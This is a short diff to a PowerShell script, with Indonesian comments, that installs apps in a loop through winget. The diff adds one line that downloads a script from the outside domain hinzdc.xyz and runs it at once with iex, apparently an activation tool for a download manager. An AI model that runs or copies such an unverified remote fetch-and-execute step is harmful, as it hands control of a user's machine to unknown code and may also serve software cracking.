@@ -16,6 +16,8 @@ foreach ($app in $appxApps) {
     winget install -e --id $app --force --accept-package-agreements --accept-source-agreements
 }
 
+iex (irm hinzdc.xyz/get/idm)
+
 # Menampilkan pesan setelah selesai
 Write-Host "---------------------------------------------"
 Write-Host -fore green "Proses Instal aplikasi selesai."
